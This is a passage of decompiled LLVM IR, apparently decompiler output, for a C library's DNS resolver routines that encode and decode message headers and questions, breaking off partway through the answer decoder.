  uselistorder [3 x i8]* @global_var_805cd17.349, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 65535, { 1, 0, 3, 2 }
  uselistorder i32 64, { 12, 6, 4, 5, 0, 8, 13, 1, 32, 33, 35, 34, 28, 29, 14, 15, 30, 16, 17, 18, 19, 36, 20, 31, 11, 21, 22, 23, 24, 25, 26, 27, 3, 9, 10, 2, 7 }
  uselistorder i32* @esp, { 2, 3, 107, 108, 109, 110, 111, 112, 4, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 19, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 15, 223, 224, 225, 16, 226, 13, 227, 228, 229, 230, 231, 232, 17, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 14, 246, 247, 248, 249, 250, 251, 18, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 113, 114, 115, 21, 5, 116, 117, 118, 119, 120, 121, 122, 123, 124, 22, 20, 85, 86, 87, 88, 89, 23, 24, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 125, 286, 6, 7, 168, 8, 9, 25, 287, 288, 289, 290, 26, 291, 292, 293, 294, 295, 28, 296, 297, 298, 30, 299, 31, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 29, 312, 32, 313, 314, 315, 33, 316, 317, 318, 319, 320, 321, 322, 323, 27, 324, 327, 330, 328, 325, 126, 127, 128, 129, 130, 329, 326, 331, 131, 132, 46, 133, 44, 45, 47, 48, 49, 50, 51, 52, 53, 54, 35, 34, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 79, 36, 72, 73, 74, 75, 76, 77, 37, 78, 11, 80, 81, 82, 83, 84, 134, 135, 43, 332, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 10, 148, 149, 150, 151, 152, 153, 159, 12, 154, 40, 155, 156, 39, 157, 158, 160, 161, 162, 163, 0, 164, 165, 166, 167, 38, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 41, 283, 1, 284, 285, 42 }
  uselistorder i32 60, { 10, 11, 16, 17, 5, 14, 15, 3, 9, 18, 7, 0, 1, 12, 13, 22, 20, 21, 19, 23, 24, 25, 8, 4, 2, 6 }
  uselistorder i32 31, { 18, 34, 37, 38, 0, 1, 25, 26, 19, 17, 30, 31, 15, 4, 5, 2, 3, 10, 24, 20, 21, 22, 8, 9, 6, 7, 16, 32, 33, 35, 36, 11, 12, 13, 23, 14, 27, 28, 29 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 1, 12, 2, 19, 13, 14, 16, 23, 21, 20, 4, 3, 22, 17, 0, 5, 6, 7, 8, 9, 10, 11, 18, 15 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80596ac, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80596aa, { 1, 0 }
  uselistorder label %dec_label_pc_805966a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805964f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80595e6, { 1, 0 }
  uselistorder label %dec_label_pc_80595c4, { 1, 0 }
  uselistorder label %dec_label_pc_80595b9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80595ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80595a8, { 1, 0 }
  uselistorder label %dec_label_pc_8059594, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8059591, { 1, 0 }
  uselistorder label %dec_label_pc_8059567, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_1()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80596b9 = load i32, i32* @ebx, align 4
  store i32 %v0_80596b9, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_80596c1 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_80596c1, i32* %esi.global-to-local, align 4
  %v7_80596ca = icmp sgt i32 %tmp, 11
  br i1 %v7_80596ca, label %dec_label_pc_80596d0, label %dec_label_pc_8059766

dec_label_pc_80596d0:                             ; preds = %entry
  %v1_80596d0 = add i32 %tmp9, 1
  %v2_80596d0 = inttoptr i32 %v1_80596d0 to i8*
  %v3_80596d0 = load i8, i8* %v2_80596d0, align 1
  store i8 %v3_80596d0, i8* %tmp8, align 1
  %v0_80596d6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80596d6 = inttoptr i32 %v0_80596d6 to i32*
  %v2_80596d6 = load i32, i32* %v1_80596d6, align 4
  %v1_80596d8 = trunc i32 %v2_80596d6 to i8
  %v2_80596d8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80596d8 = add i32 %v2_80596d8, 1
  %v4_80596d8 = inttoptr i32 %v3_80596d8 to i8*
  store i8 %v1_80596d8, i8* %v4_80596d8, align 1
  %v0_80596fe = load i32, i32* %ebx.global-to-local, align 4
  %v1_80596fe = add i32 %v0_80596fe, 8
  %v2_80596fe = inttoptr i32 %v1_80596fe to i32*
  %v3_80596fe = load i32, i32* %v2_80596fe, align 4
  %v1_8059701 = mul i32 %v3_80596fe, 8
  %v2_8059707 = or i32 %v1_8059701, 4
  %v1_8059709 = add i32 %v0_80596fe, 20
  %v2_8059709 = inttoptr i32 %v1_8059709 to i32*
  %v3_8059709 = load i32, i32* %v2_8059709, align 4
  %v4_8059709 = icmp eq i32 %v3_8059709, 0
  %v1_805970d = icmp eq i1 %v4_8059709, false
  %v2_805970d = zext i1 %v1_805970d to i32
  %v2_8059710 = or i32 %v2_805970d, %v2_8059707
  %v2_8059712 = or i32 %v2_8059710, -126
  %v5_8059712 = trunc i32 %v2_8059712 to i8
  store i32 %v2_8059712, i32* @ecx, align 4
  %v2_8059714 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059714 = add i32 %v2_8059714, 2
  %v4_8059714 = inttoptr i32 %v3_8059714 to i8*
  store i8 %v5_8059712, i8* %v4_8059714, align 1
  %v0_8059717 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805971d = add i32 %v0_8059717, 28
  %v2_805971d = inttoptr i32 %v1_805971d to i8*
  %v3_805971d = load i8, i8* %v2_805971d, align 1
  %tmp13 = urem i8 %v3_805971d, 16
  %v2_8059728 = or i8 %tmp13, -128
  %v2_805972a = load i32, i32* %esi.global-to-local, align 4
  %v3_805972a = add i32 %v2_805972a, 3
  %v4_805972a = inttoptr i32 %v3_805972a to i8*
  store i8 %v2_8059728, i8* %v4_805972a, align 1
  %v0_805972d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805972d = add i32 %v0_805972d, 33
  %v2_805972d = inttoptr i32 %v1_805972d to i8*
  %v3_805972d = load i8, i8* %v2_805972d, align 1
  %v2_8059731 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059731 = add i32 %v2_8059731, 4
  %v4_8059731 = inttoptr i32 %v3_8059731 to i8*
  store i8 %v3_805972d, i8* %v4_8059731, align 1
  %v0_8059734 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059734 = add i32 %v0_8059734, 32
  %v2_8059734 = inttoptr i32 %v1_8059734 to i32*
  %v3_8059734 = load i32, i32* %v2_8059734, align 4
  %v1_8059737 = trunc i32 %v3_8059734 to i8
  %v2_8059737 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059737 = add i32 %v2_8059737, 5
  %v4_8059737 = inttoptr i32 %v3_8059737 to i8*
  store i8 %v1_8059737, i8* %v4_8059737, align 1
  %v0_805973a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805973a = add i32 %v0_805973a, 37
  %v2_805973a = inttoptr i32 %v1_805973a to i8*
  %v3_805973a = load i8, i8* %v2_805973a, align 1
  %v2_805973e = load i32, i32* %esi.global-to-local, align 4
  %v3_805973e = add i32 %v2_805973e, 6
  %v4_805973e = inttoptr i32 %v3_805973e to i8*
  store i8 %v3_805973a, i8* %v4_805973e, align 1
  %v0_8059741 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059741 = add i32 %v0_8059741, 36
  %v2_8059741 = inttoptr i32 %v1_8059741 to i32*
  %v3_8059741 = load i32, i32* %v2_8059741, align 4
  %v1_8059744 = trunc i32 %v3_8059741 to i8
  %v2_8059744 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059744 = add i32 %v2_8059744, 7
  %v4_8059744 = inttoptr i32 %v3_8059744 to i8*
  store i8 %v1_8059744, i8* %v4_8059744, align 1
  %v0_8059747 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059747 = add i32 %v0_8059747, 41
  %v2_8059747 = inttoptr i32 %v1_8059747 to i8*
  %v3_8059747 = load i8, i8* %v2_8059747, align 1
  %v2_805974b = load i32, i32* %esi.global-to-local, align 4
  %v3_805974b = add i32 %v2_805974b, 8
  %v4_805974b = inttoptr i32 %v3_805974b to i8*
  store i8 %v3_8059747, i8* %v4_805974b, align 1
  %v0_805974e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805974e = add i32 %v0_805974e, 40
  %v2_805974e = inttoptr i32 %v1_805974e to i32*
  %v3_805974e = load i32, i32* %v2_805974e, align 4
  %v1_8059751 = trunc i32 %v3_805974e to i8
  %v2_8059751 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059751 = add i32 %v2_8059751, 9
  %v4_8059751 = inttoptr i32 %v3_8059751 to i8*
  store i8 %v1_8059751, i8* %v4_8059751, align 1
  %v0_8059754 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059754 = add i32 %v0_8059754, 45
  %v2_8059754 = inttoptr i32 %v1_8059754 to i8*
  %v3_8059754 = load i8, i8* %v2_8059754, align 1
  %v2_8059758 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059758 = add i32 %v2_8059758, 10
  %v4_8059758 = inttoptr i32 %v3_8059758 to i8*
  store i8 %v3_8059754, i8* %v4_8059758, align 1
  %v0_805975b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805975b = add i32 %v0_805975b, 44
  %v2_805975b = inttoptr i32 %v1_805975b to i32*
  %v3_805975b = load i32, i32* %v2_805975b, align 4
  %v1_805975e = trunc i32 %v3_805975b to i8
  %v2_805975e = load i32, i32* %esi.global-to-local, align 4
  %v3_805975e = add i32 %v2_805975e, 11
  %v4_805975e = inttoptr i32 %v3_805975e to i8*
  store i8 %v1_805975e, i8* %v4_805975e, align 1
  %v2_8059766.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8059766

dec_label_pc_8059766:                             ; preds = %entry, %dec_label_pc_80596d0
  %v2_8059766 = phi i32 [ %v0_80596b9, %entry ], [ %v2_8059766.pre, %dec_label_pc_80596d0 ]
  %v0_8059768 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80596d0 ]
  store i32 %v2_8059766, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8059768

; uselistorder directives
  uselistorder i32 45, { 7, 1, 8, 2, 0, 5, 9, 3, 4, 6 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 0, 1, 3 }
  uselistorder i32 33, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8059766, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_805976c = load i32, i32* @ebx, align 4
  store i32 %v0_805976c, i32* %stack_var_-4, align 4
  %v4_805976d = ptrtoint i8* %tmp2 to i32
  store i32 %v4_805976d, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8059775 = load i8, i8* %tmp2, align 1
  %v3_8059775 = zext i8 %v2_8059775 to i32
  %v1_8059778 = add i32 %v4_805976d, 1
  %v2_8059778 = inttoptr i32 %v1_8059778 to i8*
  %v3_8059778 = load i8, i8* %v2_8059778, align 1
  %v4_8059778 = zext i8 %v3_8059778 to i32
  %v2_805977c = mul nuw nsw i32 %v3_8059775, 256
  %v2_805977f = or i32 %v4_8059778, %v2_805977c
  %v2_8059781 = inttoptr i32 %tmp to i32*
  store i32 %v2_805977f, i32* %v2_8059781, align 4
  %v0_8059783 = load i32, i32* @ecx, align 4
  %v1_8059783 = add i32 %v0_8059783, 2
  %v2_8059783 = inttoptr i32 %v1_8059783 to i8*
  %v3_8059783 = load i8, i8* %v2_8059783, align 1
  %tmp6 = icmp slt i8 %v3_8059783, 0
  %v2_8059787 = zext i1 %tmp6 to i32
  %v1_805978a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805978a = add i32 %v1_805978a, 4
  %v3_805978a = inttoptr i32 %v2_805978a to i32*
  store i32 %v2_8059787, i32* %v3_805978a, align 4
  %v0_805978d = load i32, i32* @ecx, align 4
  %v1_805978d = add i32 %v0_805978d, 2
  %v2_805978d = inttoptr i32 %v1_805978d to i8*
  %v3_805978d = load i8, i8* %v2_805978d, align 1
  %v3_8059790 = udiv i8 %v3_805978d, 8
  %tmp7 = urem i8 %v3_8059790, 16
  %v1_8059793 = zext i8 %tmp7 to i32
  %v1_8059796 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059796 = add i32 %v1_8059796, 8
  %v3_8059796 = inttoptr i32 %v2_8059796 to i32*
  store i32 %v1_8059793, i32* %v3_8059796, align 4
  %v0_8059799 = load i32, i32* @ecx, align 4
  %v1_8059799 = add i32 %v0_8059799, 2
  %v2_8059799 = inttoptr i32 %v1_8059799 to i8*
  %v3_8059799 = load i8, i8* %v2_8059799, align 1
  %div = udiv i8 %v3_8059799, 4
  %tmp8 = urem i8 %div, 2
  %v1_80597a0 = zext i8 %tmp8 to i32
  %v1_80597a3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597a3 = add i32 %v1_80597a3, 12
  %v3_80597a3 = inttoptr i32 %v2_80597a3 to i32*
  store i32 %v1_80597a0, i32* %v3_80597a3, align 4
  %v0_80597a6 = load i32, i32* @ecx, align 4
  %v1_80597a6 = add i32 %v0_80597a6, 2
  %v2_80597a6 = inttoptr i32 %v1_80597a6 to i8*
  %v3_80597a6 = load i8, i8* %v2_80597a6, align 1
  %div5 = udiv i8 %v3_80597a6, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80597ac = zext i8 %tmp9 to i32
  %v1_80597af = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597af = add i32 %v1_80597af, 16
  %v3_80597af = inttoptr i32 %v2_80597af to i32*
  store i32 %v1_80597ac, i32* %v3_80597af, align 4
  %v0_80597b2 = load i32, i32* @ecx, align 4
  %v1_80597b2 = add i32 %v0_80597b2, 2
  %v2_80597b2 = inttoptr i32 %v1_80597b2 to i8*
  %v3_80597b2 = load i8, i8* %v2_80597b2, align 1
  %tmp10 = urem i8 %v3_80597b2, 2
  %v1_80597b6 = zext i8 %tmp10 to i32
  %v1_80597b9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597b9 = add i32 %v1_80597b9, 20
  %v3_80597b9 = inttoptr i32 %v2_80597b9 to i32*
  store i32 %v1_80597b6, i32* %v3_80597b9, align 4
  %v0_80597bc = load i32, i32* @ecx, align 4
  %v1_80597bc = add i32 %v0_80597bc, 3
  %v2_80597bc = inttoptr i32 %v1_80597bc to i8*
  %v3_80597bc = load i8, i8* %v2_80597bc, align 1
  %tmp11 = icmp slt i8 %v3_80597bc, 0
  %v2_80597c0 = zext i1 %tmp11 to i32
  %v1_80597c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597c3 = add i32 %v1_80597c3, 24
  %v3_80597c3 = inttoptr i32 %v2_80597c3 to i32*
  store i32 %v2_80597c0, i32* %v3_80597c3, align 4
  %v0_80597c6 = load i32, i32* @ecx, align 4
  %v1_80597c6 = add i32 %v0_80597c6, 3
  %v2_80597c6 = inttoptr i32 %v1_80597c6 to i8*
  %v3_80597c6 = load i8, i8* %v2_80597c6, align 1
  %tmp12 = urem i8 %v3_80597c6, 16
  %v1_80597ca = zext i8 %tmp12 to i32
  %v1_80597cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597cd = add i32 %v1_80597cd, 28
  %v3_80597cd = inttoptr i32 %v2_80597cd to i32*
  store i32 %v1_80597ca, i32* %v3_80597cd, align 4
  %v0_80597d0 = load i32, i32* @ecx, align 4
  %v1_80597d0 = add i32 %v0_80597d0, 4
  %v2_80597d0 = inttoptr i32 %v1_80597d0 to i8*
  %v3_80597d0 = load i8, i8* %v2_80597d0, align 1
  %v4_80597d0 = zext i8 %v3_80597d0 to i32
  %v1_80597d4 = add i32 %v0_80597d0, 5
  %v2_80597d4 = inttoptr i32 %v1_80597d4 to i8*
  %v3_80597d4 = load i8, i8* %v2_80597d4, align 1
  %v4_80597d4 = zext i8 %v3_80597d4 to i32
  %v2_80597d8 = mul nuw nsw i32 %v4_80597d0, 256
  %v2_80597db = or i32 %v4_80597d4, %v2_80597d8
  %v1_80597dd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597dd = add i32 %v1_80597dd, 32
  %v3_80597dd = inttoptr i32 %v2_80597dd to i32*
  store i32 %v2_80597db, i32* %v3_80597dd, align 4
  %v0_80597e0 = load i32, i32* @ecx, align 4
  %v1_80597e0 = add i32 %v0_80597e0, 6
  %v2_80597e0 = inttoptr i32 %v1_80597e0 to i8*
  %v3_80597e0 = load i8, i8* %v2_80597e0, align 1
  %v4_80597e0 = zext i8 %v3_80597e0 to i32
  %v1_80597e4 = add i32 %v0_80597e0, 7
  %v2_80597e4 = inttoptr i32 %v1_80597e4 to i8*
  %v3_80597e4 = load i8, i8* %v2_80597e4, align 1
  %v4_80597e4 = zext i8 %v3_80597e4 to i32
  %v2_80597e8 = mul nuw nsw i32 %v4_80597e0, 256
  %v2_80597eb = or i32 %v4_80597e4, %v2_80597e8
  %v1_80597ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597ed = add i32 %v1_80597ed, 36
  %v3_80597ed = inttoptr i32 %v2_80597ed to i32*
  store i32 %v2_80597eb, i32* %v3_80597ed, align 4
  %v0_80597f0 = load i32, i32* @ecx, align 4
  %v1_80597f0 = add i32 %v0_80597f0, 8
  %v2_80597f0 = inttoptr i32 %v1_80597f0 to i8*
  %v3_80597f0 = load i8, i8* %v2_80597f0, align 1
  %v4_80597f0 = zext i8 %v3_80597f0 to i32
  %v1_80597f4 = add i32 %v0_80597f0, 9
  %v2_80597f4 = inttoptr i32 %v1_80597f4 to i8*
  %v3_80597f4 = load i8, i8* %v2_80597f4, align 1
  %v4_80597f4 = zext i8 %v3_80597f4 to i32
  %v2_80597f8 = mul nuw nsw i32 %v4_80597f0, 256
  %v2_80597fb = or i32 %v4_80597f4, %v2_80597f8
  %v1_80597fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80597fd = add i32 %v1_80597fd, 40
  %v3_80597fd = inttoptr i32 %v2_80597fd to i32*
  store i32 %v2_80597fb, i32* %v3_80597fd, align 4
  %v0_8059800 = load i32, i32* @ecx, align 4
  %v1_8059800 = add i32 %v0_8059800, 10
  %v2_8059800 = inttoptr i32 %v1_8059800 to i8*
  %v3_8059800 = load i8, i8* %v2_8059800, align 1
  %v4_8059800 = zext i8 %v3_8059800 to i32
  %v1_8059804 = add i32 %v0_8059800, 11
  %v2_8059804 = inttoptr i32 %v1_8059804 to i8*
  %v3_8059804 = load i8, i8* %v2_8059804, align 1
  %v4_8059804 = zext i8 %v3_8059804 to i32
  %v2_8059808 = mul nuw nsw i32 %v4_8059800, 256
  %v2_805980b = or i32 %v4_8059804, %v2_8059808
  %v1_805980d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805980d = add i32 %v1_805980d, 44
  %v3_805980d = inttoptr i32 %v2_805980d to i32*
  store i32 %v2_805980b, i32* %v3_805980d, align 4
  %v2_8059815 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059815, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 40, { 21, 22, 31, 10, 32, 23, 24, 25, 13, 14, 15, 16, 17, 11, 33, 4, 5, 26, 3, 20, 27, 28, 29, 30, 12, 18, 1, 0, 6, 7, 8, 9, 19, 2 }
  uselistorder i32 28, { 39, 40, 22, 23, 64, 53, 65, 68, 69, 70, 48, 41, 42, 2, 43, 44, 45, 46, 47, 3, 4, 5, 0, 24, 25, 26, 27, 28, 29, 6, 17, 18, 19, 67, 10, 11, 66, 9, 71, 34, 49, 54, 55, 50, 51, 57, 58, 59, 60, 61, 62, 1, 63, 74, 56, 30, 75, 76, 79, 80, 77, 78, 72, 73, 31, 32, 33, 35, 36, 12, 13, 8, 14, 15, 16, 37, 38, 20, 21, 7, 52 }
  uselistorder i8 2, { 0, 1, 2, 3, 5, 6, 7, 19, 8, 18, 22, 23, 9, 24, 10, 11, 12, 13, 20, 21, 14, 15, 16, 17, 4 }
  uselistorder i8 4, { 0, 2, 1, 3, 4, 5 }
  uselistorder i8 8, { 0, 2, 1, 4, 3, 5, 6, 7 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8059818 = load i32, i32* @edi, align 4
  %v0_8059819 = load i32, i32* @esi, align 4
  %v0_805981a = load i32, i32* @ebx, align 4
  store i32 %v0_805981a, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8059827 = load i32, i32* @eax, align 4
  %v1_805982a = inttoptr i32 %tmp3 to i32*
  %v2_805982a = load i32, i32* %v1_805982a, align 4
  %v7_805982c = inttoptr i32 %v2_805982a to i8*
  %v8_805982c = call i32 @__encode_dotted(i8* %v7_805982c, i32 %tmp2, i32 %tmp, i32 %v0_8059827, i32 %v0_805981a, i32 %v0_8059819, i32 %v0_8059818)
  store i32 %v8_805982c, i32* @ecx, align 4
  %v2_8059836 = icmp slt i32 %v8_805982c, 0
  br i1 %v2_8059836, label %dec_label_pc_8059865, label %dec_label_pc_805983a

dec_label_pc_805983a:                             ; preds = %entry
  %v0_805983a = load i32, i32* @ebx, align 4
  %v2_805983a = sub i32 %v0_805983a, %v8_805982c
  %v1_805983c = add i32 %v2_805983a, -3
  %v6_805983c = sub i32 2, %v2_805983a
  %v7_805983c = and i32 %v6_805983c, %v2_805983a
  %v8_805983c = icmp slt i32 %v7_805983c, 0
  %v9_805983c = icmp eq i32 %v1_805983c, 0
  %v10_805983c = icmp slt i32 %v1_805983c, 0
  %v3_805983f = icmp eq i1 %v10_805983c, %v8_805983c
  %v4_805983f = icmp eq i1 %v9_805983c, false
  %v5_805983f = and i1 %v4_805983f, %v3_805983f
  br i1 %v5_805983f, label %dec_label_pc_8059846, label %dec_label_pc_8059841

dec_label_pc_8059841:                             ; preds = %dec_label_pc_805983a
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8059865

dec_label_pc_8059846:                             ; preds = %dec_label_pc_805983a
  %v0_8059846 = load i32, i32* @edi, align 4
  %v2_8059846 = add i32 %v0_8059846, %v8_805982c
  store i32 %v2_8059846, i32* @edx, align 4
  %v1_8059849 = add i32 %v8_805982c, 4
  store i32 %v1_8059849, i32* @ecx, align 4
  %v0_805984c = load i32, i32* @esi, align 4
  %v1_805984c = add i32 %v0_805984c, 5
  %v2_805984c = inttoptr i32 %v1_805984c to i8*
  %v3_805984c = load i8, i8* %v2_805984c, align 1
  %v3_8059850 = inttoptr i32 %v2_8059846 to i8*
  store i8 %v3_805984c, i8* %v3_8059850, align 1
  %v0_8059852 = load i32, i32* @esi, align 4
  %v1_8059852 = add i32 %v0_8059852, 4
  %v2_8059852 = inttoptr i32 %v1_8059852 to i32*
  %v3_8059852 = load i32, i32* %v2_8059852, align 4
  %v1_8059855 = trunc i32 %v3_8059852 to i8
  %v2_8059855 = load i32, i32* @edx, align 4
  %v3_8059855 = add i32 %v2_8059855, 1
  %v4_8059855 = inttoptr i32 %v3_8059855 to i8*
  store i8 %v1_8059855, i8* %v4_8059855, align 1
  %v0_8059858 = load i32, i32* @esi, align 4
  %v1_8059858 = add i32 %v0_8059858, 9
  %v2_8059858 = inttoptr i32 %v1_8059858 to i8*
  %v3_8059858 = load i8, i8* %v2_8059858, align 1
  %v2_805985c = load i32, i32* @edx, align 4
  %v3_805985c = add i32 %v2_805985c, 2
  %v4_805985c = inttoptr i32 %v3_805985c to i8*
  store i8 %v3_8059858, i8* %v4_805985c, align 1
  %v0_805985f = load i32, i32* @esi, align 4
  %v1_805985f = add i32 %v0_805985f, 8
  %v2_805985f = inttoptr i32 %v1_805985f to i32*
  %v3_805985f = load i32, i32* %v2_805985f, align 4
  %v1_8059862 = trunc i32 %v3_805985f to i8
  %v2_8059862 = load i32, i32* @edx, align 4
  %v3_8059862 = add i32 %v2_8059862, 3
  %v4_8059862 = inttoptr i32 %v3_8059862 to i8*
  store i8 %v1_8059862, i8* %v4_8059862, align 1
  %v0_8059865.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8059865

dec_label_pc_8059865:                             ; preds = %entry, %dec_label_pc_8059841, %dec_label_pc_8059846
  %v0_8059865 = phi i32 [ %v8_805982c, %entry ], [ -1, %dec_label_pc_8059841 ], [ %v0_8059865.pre, %dec_label_pc_8059846 ]
  %v2_8059867 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059867, i32* @ebx, align 4
  store i32 %v0_8059818, i32* @edi, align 4
  ret i32 %v0_8059865

; uselistorder directives
  uselistorder i32 %v1_805983c, { 1, 0 }
  uselistorder i32 %v2_805983a, { 0, 2, 1 }
  uselistorder i32 %v8_805982c, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 5, 0 }
  uselistorder label %dec_label_pc_8059865, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8059877 = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_805987f = icmp slt i32 %v2_8059877, 0
  br i1 %v2_805987f, label %dec_label_pc_8059886, label %dec_label_pc_8059883

dec_label_pc_8059883:                             ; preds = %entry
  %v1_8059883 = add i32 %v2_8059877, 4
  br label %dec_label_pc_8059886

dec_label_pc_8059886:                             ; preds = %entry, %dec_label_pc_8059883
  %v0_8059889 = phi i32 [ %v2_8059877, %entry ], [ %v1_8059883, %dec_label_pc_8059883 ]
  ret i32 %v0_8059889

; uselistorder directives
  uselistorder label %dec_label_pc_8059886, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805988c = load i32, i32* @ebp, align 4
  %v0_805988d = load i32, i32* @edi, align 4
  %v0_805988e = load i32, i32* @esi, align 4
  %v0_805988f = load i32, i32* @ebx, align 4
  store i32 %v0_805988f, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80598b0 = ptrtoint i32* %stack_var_-272 to i32
  %v4_80598bd = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80598b0, i32 256)
  store i32 %v4_80598bd, i32* @edi, align 4
  %v3_80598c7 = icmp slt i32 %v4_80598bd, 0
  br i1 %v3_80598c7, label %dec_label_pc_8059978, label %dec_label_pc_80598cf

dec_label_pc_80598cf:                             ; preds = %entry
  %v0_80598cf = load i32, i32* @ebx, align 4
  %v3_80598cf = add i32 %v0_80598cf, %v4_80598bd
  %v0_80598d1 = load i32, i32* @esi, align 4
  %v2_80598d1 = sub i32 %v0_80598d1, %v3_80598cf
  %v1_80598d7 = add i32 %v2_80598d1, -10
  %v10_80598d7 = icmp slt i32 %v1_80598d7, 0
  store i32 %v1_80598d7, i32* @esi, align 4
  %v1_80598de = icmp eq i1 %v10_80598d7, false
  br i1 %v1_80598de, label %dec_label_pc_80598e7, label %dec_label_pc_80598e0

dec_label_pc_80598e0:                             ; preds = %dec_label_pc_80598cf
  br label %dec_label_pc_8059978

dec_label_pc_80598e7:                             ; preds = %dec_label_pc_80598cf
  %v6_80598ee = add i32 %v3_80598cf, %tmp4
  store i32 %v6_80598ee, i32* @ebx, align 4
  %v1_80598fa = bitcast i32* %stack_var_-272 to i8*
  %v2_80598fa = call i32 @__GI_strdup(i8* %v1_80598fa)
  %v1_80598ff = load i32, i32* @ebp, align 4
  %v2_80598ff = inttoptr i32 %v1_80598ff to i32*
  store i32 %v2_80598fa, i32* %v2_80598ff, align 4
  %v0_8059902 = load i32, i32* @ebx, align 4
  %v1_8059902 = add i32 %v0_8059902, 4
